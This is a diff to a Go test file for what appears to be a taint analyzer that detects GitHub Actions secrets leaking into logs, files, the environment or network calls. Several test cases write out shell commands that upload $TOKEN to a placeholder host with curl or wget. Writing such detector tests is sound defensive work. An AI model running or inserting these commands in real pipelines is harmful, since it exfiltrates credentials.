@@ -75,14 +75,20 @@ func TestSecretLeakSinksAndFilters(t *testing.T) {
 		{"branch second constant target", `if true; then FILE=first.txt; else FILE=second.txt; fi; echo "$TOKEN" > "$FILE"; cat second.txt`, Log, 1},
 		{"prefix environment", `COPY="$TOKEN" printenv COPY`, Log, 1},
 		{"prefix environment is restored", `COPY="$TOKEN" true; echo "$COPY"`, "", 0},
+		{"prefix assignment does not affect argument expansion", `COPY="$TOKEN" echo "$COPY"`, "", 0},
 		{"env local environment", `env COPY="$TOKEN" printenv COPY`, Log, 1},
 		{"env command does not print environment", `env COPY="$TOKEN" true`, "", 0},
+		{"env clears environment after argument expansion", `env -i echo "$TOKEN"`, Log, 1},
 		{"function aggregate parameters", `show() { printf '%s\n' "$@"; }; show "$TOKEN"`, Log, 1},
 		{"function star parameters", `show() { echo "$*"; }; show "$TOKEN"`, Log, 1},
 		{"nested function parameters", `show() { echo "$@"; }; relay() { show "$1"; }; relay "$TOKEN"`, Log, 1},
 		{"function arguments expand before positional binding", `show() { echo "$@"; }; swap() { show "$2" "$1"; }; swap "$TOKEN" clean`, Log, 1},
 		{"pipeline network body", `printf '%s' "$TOKEN" | curl --data-binary @- https://example.test`, Network, 1},
 		{"upload tracked file", `printf '%s' "$TOKEN" > payload.txt; curl --data-binary @payload.txt https://example.test`, Network, 1},
+		{"upload tracked glob", `printf '%s' "$TOKEN" > payload.txt; curl --data-binary @payload*.txt https://example.test`, Network, 1},
+		{"curl upload file option", `printf '%s' "$TOKEN" > payload.txt; curl -T payload.txt https://example.test`, Network, 1},
+		{"wget tracked post file", `printf '%s' "$TOKEN" > payload.txt; wget --post-file=payload.txt https://example.test`, Network, 1},
+		{"read tracked glob", `printf '%s' "$TOKEN" > payload.txt; curl --data-binary "$(cat *.txt)" https://example.test`, Network, 1},
 		{"summary preserves mask-looking content", `echo "::add-mask::$TOKEN" >> "$GITHUB_STEP_SUMMARY"`, Summary, 1},
 		{"discard", `echo "$TOKEN" > /dev/null`, "", 0},
 		{"file only", `echo "$TOKEN" > token.txt`, "", 0},
@@ -157,6 +163,15 @@ func TestPersistedEnvironmentRecordsAndUnknownNames(t *testing.T) {
 `)
 	assert.Empty(t, result.Findings)
 	require.Len(t, result.Gaps, 2, "%+v", result.Gaps)
+
+	result = checkSteps(t, `      - env:
+          TOKEN: ${{ secrets.TEST_TOKEN }}
+          NAME: key
+        run: printf '%s=%s\n' "$NAME" "$TOKEN" >> "$GITHUB_ENV"
+`)
+	assert.Empty(t, result.Findings)
+	require.Len(t, result.Gaps, 1)
+	assert.Contains(t, result.Gaps[0].Reason, "dynamic GITHUB_ENV")
 }
 
 func TestActionsExpressionTaint(t *testing.T) {
